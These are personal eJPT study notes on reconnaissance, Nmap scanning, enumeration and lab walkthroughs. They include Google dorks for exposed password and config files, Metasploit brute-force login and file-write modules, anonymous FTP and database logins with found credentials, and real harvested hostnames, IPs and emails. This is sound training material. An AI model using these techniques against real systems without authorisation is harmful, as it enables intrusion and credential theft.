# eJPT-Premium-Full-Note

# eJPT

Created by: Riad Hossain
Created time: July 31, 2025 4:32 PM

**Outline:**

1.Assessment Methodologies: **Information Gathering**
2.Assessment Methodologies: **Footprinting & Scanning**
3.Assessment Methodologies: **Enumeration**
4. Assessment Methodologies: **Vulnerability Assessment**
5.Assessment Methodologies: **Auditing Fundamentals**
5.Host & Network Penetration Testing: **System/Host Based Attacks**
6.Host & Network Penetration Testing: **Network Based Attacks**
7.Nost and Network Penetration Testing: **The Metasploit Framework MSF**
8.Host and Network Penetration Testing**:Exploitation**
9.Host & Nework Penetration Testing:Post**-Exploitation**
10.Host & Network Penetration Testing: **Social Engineering**
[11.Web](http://11.web/) Application Penetration Testing: I**ntroduction to the Web &  HTTP Protocol**

  

### Penetration Testing Methodology

- 1.Information Gathering
    1. Passive Information gathering (OSINT)
    2. Active Information gathering
    
    Examples: Network Mapping, Host Discovery ,  Port Scanning, Service Detection and OS detection
    
- 2.Enumeration
    
    Service and OS enumeration 
    
    Example: Service Enumeration user enumeration share enumeration
    
- 3.Exploitation(Initial Access)
    1. Vulnerability analysis and threat modeling
    
    Examples : Vulnerability analysis , vul identification
    
     b. Exploitation
    
    Examples:
    
    Developing /modifying , Exploits, service exploitation
    
- [4.Post](http://4.Post) Exploitation
    
    Post exploitation
    
    1. local enumeration
    2. privilege escalation
    3. credential access
    4. persistence
    5. defense evasion
    6. lateral movement
- 5.Reporting
    
    reporting 
    
    1. report writing
    2. recommandations

## Intro:

Q. What is information gathering ?

1. Passive Information Gathering
2. Active Information Gathering

### Where will I find the target IPs?  cat /etc/hosts  ?

This is a good question to consider, as the IP addresses were always provided during the training. The answer is that in the exam, you will need to begin with a host discovery phase. Everything related to this step is covered in the INE course. I personally used the `netdiscover` tool, and it worked exceptionally well.

# 1.Information Gathering

# Passive Information Gathering

## **Passive Information Gathering@**

- Passive Information Gathering
    1. `host hackersploit.org`
    2. robots file - ****[https://hackersploit.org/robots.txt](https://hackersploit.org/robots.txt)
    3. site map - [https://hackersploit.org/sitemap_index.xml](https://hackersploit.org/sitemap_index.xml)
    4. Web tech - **Wappalyzer, built with** extensions 
    5. `whatweb [hackersploit.org](http://hackersploit.org)` 
    6. Download whole website - **HTTrack** 
    7. **Who is** 
    - `whois [hackersploit.org](http://hackersploit.org)`
    - `whois 172.64.32.93`
    - Sites : [who.is](http://who.is) [domaintools.com](http://domaintools.com)
    1. Website footprinting with **Netcraft** - **[https://sitereport.netcraft.com/?url=https%3A%2F%2Fhackersploit.org](https://sitereport.netcraft.com/?url=https%3A%2F%2Fhackersploit.org)**
    2. **Dnsrecon**
    - `dnsrecon -d [hackersploit.org](http://hackersploit.org/)`
    - Site: dnsdumpster.com
    1. **WAF** 
    - Download : https://github.com/EnableSecurity/wafw00f
    - `wafw00f [hackertube.net](http://hackertube.net/) -a`
    1. Subdomain Enumeration - **Sublist3r**
    - `sublist3r -d [hackersploit.com](http://hackersploit.com/) -o hs_sub_enum.txt`
    1. **Google dorks**
    - site:ine.com
    - site:ine.com employees
    - site:ine.com inurl:forum
    - site:*.ine.com
    - site:*.ine.com intitle:forum
    - site:*.ine.com filetype:pdf
    - inurl:auth_user_file.txt
    - inurl:passwd.txt
    - inurl:wp-config.bak
    1. waybackmachine 
    2. **Email Harvesting** 
    - `theHarvester -d [hackersploit.org](http://hackersploit.org/)`
    - `theHarvester -d [hackersploit.org](http://hackersploit.org/) -b google,linkedin,dnsdumpster,duckduckgo,crtsh`
    - `theHarvester -d [zonetransfer.me](http://zonetransfer.me/) -b all`
    1. Leaked Passwords database : [https://haveibeenpwned.com/](https://haveibeenpwned.com/)

## **Website Recon and Footprinting**

- IP Addresses
- Directories hidden from search engine
- Names
- Email address
- Phone numbers
- Physical address
- Web technologies being used

Passive Recon:

>what is host

>host hackersploit.org

### robots.txt:

for example: **https://hackersploit.org/robots.txt**

here, website like google /bing/duckduckgo will crawl the website

.. most website has robots.txt , which website does not have robots.txt which means really doing something wrong . IT specify (robots.txt) what folders or what files you don’t want search engine to index.

crawling: It essentially refine the website and then it indexes it on google.com

### sitemap.xml

for example: **https://hackersploit.org/sitemap.xml**

-access publically if particular page are not linked on the main website/front end of a website this provide or tell us some of the others linked/pages than can be accessed publically… like for wordpress website

**extensions:**

### (Build with) and (wappalyzer)

— tell us what is running on that website/what web technology/ content management system is , like wordpress or IP or version

command in kali linux:

```bash
what web

whatweb hackersploit.rog
```

### HTTrack /HDTrack

You can download teh entire website as is through tools

```bash
sudo apt get install webthttrack
```

### **Whois Enumeration**

**Website Footprinting with Netcraft**

—website recon or footprinting with netcraft

__a. netcraft—b. resources…c. site report

### **DNS Recon**

Tool: google dns recon ( is a python scripts enum general dns records of  domain)

site:: [**https://dnsdumpster.com/](https://dnsdumpster.com/)    ( good site for dns recon) , for this I can identify subdomain also.**

- commands
    
    ```bash
    dnsrecon —help
    
    dnsrecon -d [hackersploit.org](http://hackersploit.org)       — where d for specify the domain name
    
    dnsrecon -d zonetransfer.me
    ```
    

**WAF with wafw00f**

- WAFW00F
    
    The web application firewall fingerprinting tool 
    
    sends normal http request and get normal response
    
    ** quickly identifying whether a website or web app is being protected by a web app firewall**
    
    -identify what firewall will show what next steps are…
    
    >waf00f -h
    
    >waf00f -l ( l for list)
    
    >waf00f hackersploit.org
    
    note: The site [https://hackersploit.org](https://hackersploit.org/) is behind Cloudflare (Cloudflare Inc.) 
    
    >waf00f zonetransfer.me
    
    note: no waf detected by the generic detection , so what is actually mean by this? this is not protected.
    
    … with dns dumpster in the previous could possibly be the IP address of the server that’s could possibly actually hosting that website.
    
    >wafw00f [https://hackertube.net](https://hackertube.net)    ( this does not change the output, it will same as previous command)
    
    >wafw00f [https://hackertube.net](https://hackertube.net) -a    ( a for all possible waf instances)
    

### **Subdomain Enumeration with Sublist3r**

—Passive::: this not actively enum  , here using publicly available sources of information , not using bruteforce (at that point will be actively engaging with the target system)

>sublist3r -d [hackersploit.org](http://hackersploit.org/) 

.. note: total unique subdomains found:1 ; **forum.hackersploit.org**

>sublist3r -d [ine.com](http://ine.com/)   

- find unique subdomains : 17
    
     
    
    [1.assets.ine.com](http://1.assets.ine.com/)
    [2.profiles.assets.ine.com](http://2.profiles.assets.ine.com/)
    [careers.ine.com](http://careers.ine.com/)
    [certs.ine.com](http://certs.ine.com/)
    [checkout.ine.com](http://checkout.ine.com/)
    [els-cdn.content-api.ine.com](http://els-cdn.content-api.ine.com/)
    [courses.ine.com](http://courses.ine.com/)
    [dashboard.ine.com](http://dashboard.ine.com/)
    [info.ine.com](http://info.ine.com/)
    [assets.labs.ine.com](http://assets.labs.ine.com/)
    [learn.ine.com](http://learn.ine.com/)
    [legacy-community.ine.com](http://legacy-community.ine.com/)
    [my.ine.com](http://my.ine.com/)
    [rentals.ine.com](http://rentals.ine.com/)
    [security.ine.com](http://security.ine.com/)
    [shop.ine.com](http://shop.ine.com/)
    [17.showcase.ine.com](http://17.showcase.ine.com/)
    

### **Google Dorks**

Internet Archive : [https://web.archive.org/](https://web.archive.org/)  this is waybackmachine

- google dorks:
    1. site:[ine.com](http://ine.com)          ( where all results ine.com related)
    2. site:ine.com inurl:admin
    3. site:ine.com inurl:forum
    4. site:*.ine.com          ( it will show sub domains for I need)
    5. site:*.ine.com inurl:admin
    6. site:*.ine.com intitle:admin
    7. site:*.ine.com filetype:pdf
    8. site:ine.com employees or instructors
    9. intitle:index of        ( common vul within web servers)
    10. cache:ine.com
    11. inurl:auth_user_file.txt
    12. inurl:passwd.txt
    
    *** GHDB—google hacking database
    

**Email Harvesting with theHarvester**

- theHarvester   ( this is passive enum tool works with OSINT )
    
    >theHarvester -d [ine.com](http://ine.com/) -b baidu,bevigil,bing,bingapi,brave,bufferoverun,censys,certspotter,criminalip,crtsh,dehashed,dnsdumpster,duckduckgo,fullhunt,github-code,hackertarget,hunter,hunterhow,intelx 
    
    - output
        
        ## [*] Hosts found: 95
        
        - .ine.com
        
        [1pass-scim.ine.com](http://1pass-scim.ine.com/)
        
        1pass-scim.ine.com:35.227.112.188
        
        admin-api.ine.com:3.209.49.29
        
        admin.ine.com:75.140.41.9
        
        [admin.showcase.ine.com](http://admin.showcase.ine.com/)
        
        admin.showcase.ine.com:216.239.32.21
        
        ads.ine.com:64.22.127.46
        
        [apparel.ine.com](http://apparel.ine.com/)
        
        [assets.ine.com](http://assets.ine.com/)
        
        assets.ine.com:18.155.202.85
        
        [b.ine.com](http://b.ine.com/)
        
        bid46yz.45160067t.help.ine.com:158.247.19.249
        
        bid47mj.45160067m.email.ine.com:158.247.23.73
        
        blog.ine.com:44.199.137.201
        
        blog.ine.com:75.140.41.19
        
        [bootcamps.ine.com](http://bootcamps.ine.com/)
        
        bz719.e.ine.com:223.165.116.47
        
        bz720.billing.ine.com:223.165.117.227
        
        [careers.ine.com](http://careers.ine.com/)
        
        [certs.ine.com](http://certs.ine.com/)
        
        checkout.ine.com:13.227.74.73
        
        chef01.ine.com:52.71.19.199
        
        [clicks.ine.com](http://clicks.ine.com/)
        
        clicks.ine.com:108.138.128.48
        
        community.development.ine.com:3.80.85.11
        
        [compliance.ine.com](http://compliance.ine.com/)
        
        [content-api.development.ine.com](http://content-api.development.ine.com/)
        
        [content-api.ine.com](http://content-api.ine.com/)
        
        content-api.ine.com:54.211.233.49
        
        [content-api.staging.ine.com](http://content-api.staging.ine.com/)
        
        courses.ine.com:3.216.42.5
        
        [dashboard.development.ine.com](http://dashboard.development.ine.com/)
        
        [dashboard.ine.com](http://dashboard.ine.com/)
        
        [dashboard.staging.ine.com](http://dashboard.staging.ine.com/)
        
        [dashboard2.development.ine.com](http://dashboard2.development.ine.com/)
        
        [development.ine.com](http://development.ine.com/)
        
        [events.development.ine.com](http://events.development.ine.com/)
        
        [events.ine.com](http://events.ine.com/)
        
        events.ine.com:18.238.49.129
        
        [feedback.my.ine.com](http://feedback.my.ine.com/)
        
        feedback.my.ine.com:192.241.183.155
        
        [get.ine.com](http://get.ine.com/)
        
        [helpdesk.ine.com](http://helpdesk.ine.com/)
        
        [helpdesk.serviceportal.ine.com](http://helpdesk.serviceportal.ine.com/)
        
        [inedid.az.demos.ine.com](http://inedid.az.demos.ine.com/)
        
        [info.ine.com](http://info.ine.com/)
        
        [internal.ine.com](http://internal.ine.com/)
        
        [labs.ine.com](http://labs.ine.com/)
        
        [learn.ine.com](http://learn.ine.com/)
        
        [legacy-community.ine.com](http://legacy-community.ine.com/)
        
        live.ine.com:75.140.41.227
        
        logs.ine.com:50.16.129.90
        
        [marketing.ine.com](http://marketing.ine.com/)
        
        media1.ine.com:75.140.41.39
        
        members.ine.com:52.44.139.85
        
        my.development.ine.com:13.227.74.42
        
        [my.ine.com](http://my.ine.com/)
        
        my.ine.com:3.169.183.59
        
        [pritunl.ine.com](http://pritunl.ine.com/)
        
        pritunl.ine.com:34.206.234.208
        
        profiles.ine.com:52.201.209.93
        
        racks.ine.com:24.172.112.44
        
        racks2.ine.com:24.172.112.44
        
        racks2.ine.com:75.140.41.68
        
        [rancher-eks.ine.com](http://rancher-eks.ine.com/)
        
        rancher-eks.ine.com:34.234.42.250
        
        rancher-eks.rancher.ine.com:54.225.200.251
        
        [rancher.ine.com](http://rancher.ine.com/)
        
        rancher.ine.com:34.238.92.57
        
        [releases.ine.com](http://releases.ine.com/)
        
        rentals.ine.com:54.241.208.226
        
        scrack-vpn.ine.com:75.140.41.125
        
        [security.ine.com](http://security.ine.com/)
        
        security.ine.com:141.193.213.11
        
        [shop.ine.com](http://shop.ine.com/)
        
        shopify.ine.com:104.236.221.73
        
        [showcase.ine.com](http://showcase.ine.com/)
        
        showcase.ine.com:216.239.34.21
        
        [sonar.my.development.ine.com](http://sonar.my.development.ine.com/)
        
        sonar.my.development.ine.com:108.139.10.42
        
        [staging.ine.com](http://staging.ine.com/)
        
        statistics.ine.com:54.175.128.39
        
        [status.ine.com](http://status.ine.com/)
        
        store.ine.com:75.140.41.18
        
        subscriptions.development.ine.com:18.208.68.251
        
        subscriptions.ine.com:52.201.209.93
        
        support.ine.com:75.140.41.26
        
        [try.ine.com](http://try.ine.com/)
        
        uaa.development.ine.com:50.17.32.88
        
        updates.ine.com:23.21.86.19
        
        [vid.ad.demos.ine.com](http://vid.ad.demos.ine.com/)
        
        vorack-vpn.ine.com:75.140.41.126
        
        workbooks.ine.com:108.138.246.78
        
        [www2.ine.com](http://www2.ine.com/)
        
    
    >theHarvester -d [ine.com](http://ine.com/) -b duckduckgo,yahoo,bing,baidu
    **Output:**
    
    ## [*] Emails found: 7
    
    [e@hooine.com](mailto:e@hooine.com)
    
    [eason@ryine.com](mailto:eason@ryine.com)
    
    [emailthenose@arrowine.com](mailto:emailthenose@arrowine.com)
    
    [info@presenceafricaine.com](mailto:info@presenceafricaine.com)
    
    [lasse.rousi@medixine.com](mailto:lasse.rousi@medixine.com)
    
    [u@hblightshine.com](mailto:u@hblightshine.com)
    
    [u@hbligine.com](mailto:u@hbligine.com)
    
    [*] No people found.
    
    ## [*] Hosts found: 8
    
    [R3.ine.com](http://r3.ine.com/)
    
    [blog.ine.com](http://blog.ine.com/)
    
    [checkout.ine.com](http://checkout.ine.com/)
    
    [info.ine.com](http://info.ine.com/)
    
    [learn.ine.com](http://learn.ine.com/)
    
    [members.ine.com](http://members.ine.com/)
    
    [my.ine.com](http://my.ine.com/)
    
    [showcase.ine.com](http://showcase.ine.com/)
    

Free to test this or to perform reconnaissance on this domain [zonetransfer.me](http://zonetransfer.me) site

**Leaked Password Databases**

- [haveibeenpwned.com](http://haveibeenpwned.com) site
    
    

# Active Information Gathering

## Active Information Gathering@

- Active Information Gathering
    1. DNS record & Zone Transfer `dnsenum [zonetransfer.me](http://zonetransfer.me)` 
    2. Host discovery with Nmap 
    - `cat /etc/hosts`
    - `nmap -sn 192.168.2.0/24`
    - `netdiscover -i eth0 -r 192.168.2.0/24`
    1. Port Scanning with nmap 
    - `nmap 192.168.2.3`
    - `nmap -Pn 192.168.2.3`
    - `nmap -Pn -p- 192.168.2.3`
    - `nmap -Pn -p- -F -sU 192.168.2.3`
    - `nmap -p 80,44 192.168.2.3`
    - `nmap -p- -sV 192.168.2.3`
    - `nmap -sV -p- -O 192.168.2.3`
    - `nmap -Pn -F 192.168.2.3 -oN outputfile.txt`

### **DNS Zone Transfers**

- Domain Name System DNS is a protocol that is used to resolve domain names/hostnames to IP addresses
- During the early days of the internet, users would have to remember the IP addresses of the sites that they wanted to visit, DNS resolves this issue by mapping domain names ( easier to recall ) to their respective IP addresses.
- A DNS server (nameserver ) is like a telephone directory that contains domain names and their corresponding IP addresses
- A plethora of public DNS server have been set up by companies like Cloudflare (1.1.1.1) and google (8.8.8.8) . These DNS servers contain the recoreds of almost all domains on the internet.

A-  resolves a hostname or domain to an IPv4 adress

AAAAA - resolves a hostname or domain to an IPv6 address

NS- reference to the domains nameserver

MX —mail server

CNAME — domain aliases

TXT— text record

HINFO — host information 

SOA— domain authority

SRV— service records

PTR — resolves an IP address to a hostname 

**DNS Interrogation** :: is the process of enumerating DNS record for a  specific domain 

**DNS Zone Transfe**r:

[ZoneTransfer.me](http://ZoneTransfer.me) is a website 

In [DNSdumpster.com](http://DNSdumpster.com) (dns recon & research, find & lookup dns records) search [Zonetransfer.me](http://Zonetransfer.me) 

—

>dnsrecon -d zonetransfer.me/hackersploit.org

**>dnsenum zonetransfer.me**

>sudo vim /etc/host     — wifi ip like :: 192.168.1.1 router.admin and search in browser this ip 

>whatis dig            —- dns lookup utility

>dig axfr @nsztm1.digi.ninja zonetransfer.me

>fierce  -h       —is a semi light weight scanner that helps locate IP space and hostnames against specified domains

>fierce -dns hackerploit.org

### **Host Discovery with Nmap**

- command
    
    ```bash
    sudo nmap -sn 192.168.2.0/24
    
    sudo netdiscover -i eth0 -r 192.168.2.0/24
    ```
    

### **Port Scanning with Nmap**

- command
    
    ```bash
    nmap -sS -A IP
    ```
    
    ```bash
    namp -Pn 10.4.19.218      —-just port scan
    
    namp -Pn -p 80,445, 3389 IP        — specify the port number
    
    nmap -Pn -p1-1000 ip
    
    namp -Pn -F ip           __ fast scan
    
    namp -Pn -sU ip          —— UDP port scan
    
    namp -Pn -F ip -v        — verbose , what port to be discovered
    
    namp -Pn -F -sV ip            — service version 
    
    namp -Pn -F -sV -O ip         —- uppercase O means OS 
    
    namp -Pn -F -sV -O -sC ip -v        — script sC get more info about open port
    
    **A—— -sV -O -sC** 
    
    namp -Pn -F -A ip -v
    
    man nmap               to know like help
    
    T0(slow) to T5(faster)
    
    namp -Pn -F  **-T5** -sV -O -sC ip -v           —-much faster make site slow
    
    nmap -Pn -F ip -oN test.txt              ————-output in txt formate
    
    nmap -Pn -F ip -oX test.xml              ====output in xml format
    ```
    

**Nmap Scan:**

**>nmap -Pn -sC -A -T4 -O ip**

**>nmap -sC -A -p21 ip      //further scan** 

### CTF_01 :

**Q.1 This tells search engines what to and what not to avoid.**

**Solution: target_url/robots.txt** 

**Q.2 What website is running on the target, and what is its version?**

Solution: ****

```bash
**nmap** target.ine.local -sC -sV
```

**Q.3 Directory browsing might reveal where files are stored.\**

Solution: 

        

```bash
**dirb** [http://target.ine.local](http://target.ine.local)
```

              browser: target.ine.local/wp-content/uploads/

               flag.txt

**Q.4 An overlooked backup file in the webroot can be problematic if it reveals sensitive configuration details.**

Solution: 

```bash
**dirb [http://target.ine.local](http://target.ine.local/) -w /usr/share/dirb/wordlists/big.txt -X**
```

 **.bak,.tar.gz,.zip,.sql,.bak.zip**

```bash
**curl [http://target.ine.local/wp-config.bak](http://target.ine.local/wp-config.bak)**
```

**Q.5 Certain files may reveal something interesting when mirrored.**

Solution: 

```bash
httrack [http://target.ine.local](http://target.ine.local/) -O target.html
```

  where we need to mirror the website to  find this flag, to mirror use httrack command

>cd target.html >cd target.ine.local >cat smlrpc0db0.php

# 2.**Footprinting & Scanning**

**Labs:**

- **Windows Recon: Nmap Host Discovery**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at demo.ine.local.
    
    **Objective:** Your task is to discover available live hosts and their open ports using Nmap and identify the running services and applications.
    
    Tools: Nmap
    
    ```bash
    ping -c 5 demo.ine.local
    nmap demo.ine.local
    nmap -Pn demo.ine.local
    nmap -Pn -p 443 demo.ine.local
    //We can observe in the Nmap output that the host is up, but port 443 is filtered.
    nmap -Pn -sV -p 80 demo.ine.local
    ```
    
- **Scan the Server 1**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** This lab covers the process of performing port scanning and service detection with Nmap.
    
    Tools: Nmap
    
    ```bash
    ping -c 4 demo.ine.local
    nmap demo.ine.local
    nmap demo.ine.local -p-
    nmap demo.ine.local -p 6421,41288,55413 -sV
    
    ```
    
- **CTF 1**
    - **Flag 1**: The server proudly announces its identity in every response. Look closely; you might find something unusual.
    - **Flag 2**: The gatekeeper's instructions often reveal what should remain unseen. Don't forget to read between the lines.
    - **Flag 3**: Anonymous access sometimes leads to forgotten treasures. Connect and explore the directory; you might stumble upon something valuable.
    - **Flag 4**: A well-named database can be quite revealing. Peek at the configurations to discover the hidden treasure.
    
    ```bash
    //flag1
    nmap target.ine.local -sC -sV
    
    //flag2
    nmap -p 80 --script http-enum target.ine.local 
    or
    gobuster dir -u http://target.ine.local -w /usr/share/wordlists/dirb/common.txt -x php,conf,ini,txt
    curl http://target.ine.local/robots.txt
    curl http://target.ine.local/secret-info/flag.txt
    
    //flag3
    nmap -p 21 target.ine.local 
    ftp target.ine.local 
    Name: anonymous
    Password: enter(null)
    ftp> help
    ftp> dir
    ftp>mget flag.txt
    ftp>mget creds.txt
    $ls
    $cat flag.txt
    
    //flag4
    nmap -p 3306,1433,5432 target.ine.local 
    //mysql 
    mysql -u db_admin -p -h target.ine.local 
    password:password@123 (from cat creds.txt)
    MySQL>show databases;
    
    ```
    
- **Windows Recon: SMB Nmap Scripts**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Your task is to fingerprint the service using the tools available on the Kali machine and run Nmap scripts to enumerate the Windows target machine's SMB service.
    
    1. Identify SMB(server message block) Protocol Dialects
    2. Find SMB security level information
    3. Enumerate active sessions, shares, Windows users, domains, services, etc.
    
    **The following username and password may be used to access the service:**
    
    | Username | Password | | administrator | smbserver_771 |
    
    Tools: Nmap
    
    ```bash
    
    ping -c 5 demo.ine.local
    nmap demo.ine.local
    nmap -p445 --script smb-protocols demo.ine.local
    nmap -p445 --script smb-security-mode demo.ine.local
    nmap -p445 --script smb-enum-sessions demo.ine.local
    nmap -p445 --script smb-enum-sessions --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-shares demo.ine.local
    nmap -p445 --script smb-enum-shares --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-server-stats --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-domains --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-groups --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    nmap -p445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator,smbpassword=smbserver_771 demo.ine.local
    
    ```
    

- **Objectives**
    1. you will have a solid understanding of the importance of network mapping and port scanning.
    2. you will have a basic understanding of the OSI model and transport layer protocols like **TCP and UDP**
    3. you will be able to comprehensively map out a network and discover different host on a target network with Nmap
    4. you will be able to identify open port on target hosts and identify the services running on them
    5. you will be able to perform OS and service fingerprinting with Nmap
    6. you will have an understanding of how to detect and evade firewalls with Nmap
    7. you will be able to speed up or slow down Nmap scans depending on the target environment
- Introduction
    
    Penetration Testing Methodology
    
- Networking Primer
    - Networking Fundamentals
        
        Network protocols
        
        **Packets**
        
        structure: Header , Payload(actual data, contain sources and destination)
        
        **OSI (open systems interconnection ) Model**
        
        OSI Layer
        
        1. Physical layer —- usb, ethernet cables, coax, fiber , hub etc —-**attack:: cable tapping, wire tapping, singal jamming, usb type deye attack**
        2. Data link layer——- ethernet ,ppp, switches:   **arp spoofing, mac spoofing, mimt**
        3. Network layer ——- ip, icmp , IPSec  : **ip spoofing, dos ddos,** 
        4. Transport layer ——-tcp, udp ::  **tcp synflood, udp flooding, port scanning**
        5. Session layer ——APIs, NetBios, RPC ::: session **hyjacking , man in the middle attack**
        6. Presentation layer — SSL/TLS, JPEG, GIF, SSH, IMAP:::: **ssl triping attack (encryption) pinon , buffer overflow attack, data injection**
        7. Application layer ——HTTP, FTP, IRC, SSH, DNS ::: **fishing , sql , xss**
        
            
        
        TCP: reliable(if data lost, you can again send data, take time(diff diff segment e ) , gradually data transfer)
        
        UDP: not reliable , so fast, directly send, **Live streaming , online gaming** 
        
    
    **IP Internet Protocol Functionality**
    
    ICMP Internet Control Message Protocol 
    
    DHCP Dynamic Host Configuration Protocol
    
    **IP Header Format**
    
    **Demo: IP Header Analysis**
    
    **Important Port(well known 0-1023)**
    
    Standardized by IANA(Internet Assigned Numbers Authority)
    
    | **Port Number** | **Services** | **Descriptions** |
    | --- | --- | --- |
    | 80 | HTTP | Hypertext Transfer Protocol |
    | 443 | HTTPS | HTTP Secure |
    | 21 | FTP | File Transfer Protocol |
    | 22 | SSH | Secure Shell |
    | 25 | SMTP | Simple Mail Transfer Protocol |
    | 110 | POP3 | Post Office Protocol version 3 |
    
    | **Ports** | **Descriptions** |
    | --- | --- |
    | 3389 | RDP Remote Desktop Protocol |
    | 3306 | MySQL Database |
    | 8080 | HTTP alternative port |
    | 27017 | MongoDB Database |
    
    ## **Transport Layer -Part2**
    
    # netstat
    
    ```bash
    netstat -antp         
    ```
    

## **Footprinting & Scanning@**

- Foot printing & Scanning
    1. Wireshark
    2. Arp scan `arp-scan -I eth1 192.168.31.0/24`
    3. Ping `ping 192.168.31.2`
    4. fping `fping -I eth1 -g 192.168.31.0/24 -a`
    5. nmap `nmap -sn 192.168.31.0/24`
    6. Zenmap - GUI of nmap 

# Assessment Methodologies: 25%

**Q.**

- **Locate endpoints on a network**
- **Identify open ports and services on a target**
- **Identify operating system of a target**
- **Extract company information from public sources**
- **Gather email addresses from public sources**
- **Gather technical information from public sources**
- **Identify vulnerabilities in services**
- **Evaluate information and criticality or impact of vulnerabilities**

# Enumeration

**Labs:**

- **FTP Enumeration**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Your task is to perform FTP enumeration with Metasploit.
    
    Tools: Metasploit Framework , FTP client
    
    ```bash
    ping -c 4 demo.ine.local
    msfconsole
    use auxiliary/scanner/ftp/ftp_version
    set RHOSTS demo.ine.local
    run
    use auxiliary/scanner/ftp/ftp_login
    set RHOSTS demo.ine.local
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
    run
    use auxiliary/scanner/ftp/anonymous
    set RHOSTS demo.ine.local
    run
    ftp demo.ine.local
    
    ```
    
- **Samba Recon:Basics(SMB Enumeration)**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
    
    **Objective:** Answer the following questions:
    
    1. Find the default tcp ports used by smbd.
    2. Find the default udp ports used by nmbd.
    3. What is the workgroup name of samba server?
    4. Find the exact version of samba server by using appropriate nmap script.
    5. Find the exact version of samba server by using smb_version metasploit module.
    6. What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
    7. Find the NetBIOS computer name of samba server using nmblookup
    8. Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.
    9. Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
    
    Tools: Nmap, Metasploit, nmblookup, smbclient, rpcclient
    
    ```bash
    nmap demo.ine.local
    nmap -sU --top-ports 25 demo.ine.local
    nmap -sV -p 445 demo.ine.local
    nmap --script smb-os-discovery.nse -p 445 demo.ine.local
    
    msfconsole -q
    use auxiliary/scanner/smb/smb_version
    set RHOSTS demo.ine.local
    exploit
    
    nmap --script smb-os-discovery.nse -p 445 demo.ine.local
    nmblookup -A demo.ine.local
    // Find the NetBIOS computer name of samba server using nmblookup.
    smbclient -L demo.ine.local -N
    //Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not
    rpcclient -U "" -N demo.ine.local
    //Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
    ```
    
- **Apache Enumeration (web server enumeration)**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at "victim-1".
    
    **Objective:** Run the following auxiliary modules against the target (victim-1):
    
    - auxiliary/scanner/http/apache_userdir_enum
    - auxiliary/scanner/http/brute_dirs
    - auxiliary/scanner/http/dir_scanner
    - auxiliary/scanner/http/dir_listing
    - auxiliary/scanner/http/http_put
    - auxiliary/scanner/http/files_dir
    - auxiliary/scanner/http/http_login
    - auxiliary/scanner/http/http_header
    - auxiliary/scanner/http/http_version
    - auxiliary/scanner/http/robots_txt
    
    Tools: Metasploit Framework
    
    ```bash
    ping -c 5 victim-1
    msfconsole -q
    use auxiliary/scanner/http/http_version
    set RHOSTS victim-1
    run
    
    use auxiliary/scanner/http/robots_txt
    set RHOSTS victim-1
    run
    
    use auxiliary/scanner/http/http_header
    set RHOSTS victim-1
    run
    use auxiliary/scanner/http/http_header
    set RHOSTS victim-1
    set **TARGETURI /secure**
    run
    use auxiliary/scanner/http/brute_dirs
    set RHOSTS victim-1
    run
    
    use auxiliary/scanner/http/dir_scanner
    set RHOSTS victim-1
    set **DICTIONARY** /usr/share/metasploit-framework/data/wordlists/directory.txt
    run
    
    use auxiliary/scanner/http/dir_listing
    set RHOSTS victim-1
    set PATH **/data**
    run
    
    use auxiliary/scanner/http/files_dir
    set RHOSTS victim-1
    set VERBOSE false
    run
    use auxiliary/scanner/http/http_put
    set RHOSTS victim-1
    set **PATH /data**
    set **FILENAME test.txt**
    set **FILEDATA "Welcome To AttackDefense"**
    run
    //We can observe that we have successfully written a file on the target server. If the file is already exists it will overwrite it. Let’s use wget and download the test.txt file and verify it.
    
    wget http://victim-1:80/data/test.txt 
    cat test.txt
    
    use auxiliary/scanner/http/http_put
    set RHOSTS victim-1
    set PATH /data
    set FILENAME test.txt
    set ACTION DELETE
    run
    wget http://victim-1:80/data/test.txt 
    
    use auxiliary/scanner/http/**http_login**
    set RHOSTS victim-1
    set AUTH_URI /secure/
    set VERBOSE false
    run
    
    use auxiliary/scanner/http/apache_userdir_enum
    set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
    set RHOSTS victim-1
    set VERBOSE false
    run
    
    ```
    
- **MySQL Enumeration**
    
    In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a MySQL service will be accessible at **demo.ine.local**.
    
    **Objective:** Your task is to run the following auxiliary modules against the target:
    
    - auxiliary/scanner/mysql/mysql_version
    - auxiliary/scanner/mysql/mysql_login
    - auxiliary/admin/mysql/mysql_enum
    - auxiliary/admin/mysql/mysql_sql
    - auxiliary/scanner/mysql/mysql_file_enum
    - auxiliary/scanner/mysql/mysql_hashdump
    - auxiliary/scanner/mysql/mysql_schemadump
    - auxiliary/scanner/mysql/mysql_writable_dirs
    
    Tools: Nmap , Metasploit Framework
    
    ```bash
    ping -c 4 demo.ine.local
    nmap demo.ine.local
    
    msfconsole -q
    use auxiliary/scanner/mysql/mysql_version
    set RHOSTS demo.ine.local
    run
    
    use auxiliary/scanner/mysql/mysql_login
